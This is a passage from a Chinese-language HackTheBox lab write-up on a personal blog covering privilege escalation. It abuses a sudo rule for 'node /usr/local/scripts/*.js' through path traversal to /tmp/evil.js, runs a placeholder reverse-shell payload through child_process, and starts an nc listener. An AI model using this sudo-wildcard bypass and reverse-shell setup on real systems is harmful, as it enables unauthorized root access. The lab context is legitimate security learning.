+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647005577-0df63a02-73a5-493c-ab31-7b84eaf5f932.png#averageHue=%2326282f&clientId=u878aad36-f4b0-4&from=paste&height=317&id=u7acf3c23&name=image.png&originHeight=396&originWidth=1265&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88477&status=done&style=none&taskId=u9bcad26b-66f4-4017-9dd9-5241de10823&title=&width=1012" alt="image.png"><br>啥都没有扑了个空，然后内核版本5.4.0并没什么漏洞，所以就开始思考能否利用服务进行提权，<code>sudo -l</code>查看可以sudo的指令：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647058359-cb1b3b9a-9b0e-495a-b07d-17f8f4bf9259.png#averageHue=%23282a31&clientId=u878aad36-f4b0-4&from=paste&height=134&id=u4f5bf6c9&name=image.png&originHeight=167&originWidth=1118&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43763&status=done&style=none&taskId=ue34b64d8-0f5c-4085-bccf-620df6720fb&title=&width=894.4" alt="image.png"><br><code>/usr/bin/node /usr/local/scripts/*.js</code>，我们可以调用nodejs的node指令运行&#x2F;usr&#x2F;local&#x2F;scripts目录下的所有js文件，这样思路就明确了，创建恶意js文件，之后node运行获得root反弹shell</p>
+<h1 id="目录-Bypass-Tricks"><a href="#目录-Bypass-Tricks" class="headerlink" title="目录 Bypass Tricks"></a>目录 Bypass Tricks</h1><p>这里有个问题，就是scripts目录下不可写：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647144659-4530e4ed-76a4-4f59-8d55-8c88ff3be4d2.png#averageHue=%23272b32&clientId=u878aad36-f4b0-4&from=paste&height=188&id=u8cb0dbf3&name=image.png&originHeight=235&originWidth=1058&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71011&status=done&style=none&taskId=ud1602976-214c-4cee-803b-276add529dc&title=&width=846.4" alt="image.png"><br>但是tmp目录可写，这里有个tricks，<code>.</code>,<code>..</code>代表当前目录和上级目录，也是包含在<code>scripts/*.js</code>中的，因此这里可以利用个目录穿越bypass<br><code>sudo node /usr/local/scripts/../../../tmp/evil.js</code>，这样即可运行恶意js文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line">exec.<span class="title function_">execSync</span>(<span class="string">&#x27;reverse_shell_payload&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>接下来本地起一个监听<code>nc -lvnp 7788</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647361532-9e827e22-61d4-4425-bed5-c3907a0fbe8d.png#averageHue=%232a2d34&clientId=u878aad36-f4b0-4&from=paste&height=58&id=u8b40101b&name=image.png&originHeight=72&originWidth=743&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22260&status=done&style=none&taskId=ubd6090dc-58c9-498b-b86b-ddcbb961eaa&title=&width=594.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647378083-9fc5921f-0d13-4c82-9635-6a7d77c806db.png#averageHue=%2325272e&clientId=u878aad36-f4b0-4&from=paste&height=139&id=ucc576254&name=image.png&originHeight=174&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35116&status=done&style=none&taskId=u0a1409ed-287b-46c2-9a72-781dec6f1c6&title=&width=736.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676647425650-f5263c16-7fc2-4e28-b46c-29bec851e5dc.png#averageHue=%23192231&clientId=u878aad36-f4b0-4&from=paste&height=653&id=u9144b5cf&name=image.png&originHeight=816&originWidth=1010&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188830&status=done&style=none&taskId=uf08a1911-8942-413a-9b0f-4fd9be7e32d&title=&width=808" alt="image.png"></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/HackTheBox/" class="tag">#HackTheBox</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/DASCTF%20MAY%20%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">DASCTF MAY出题人挑战赛</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/Ambassador/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Ambassador</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
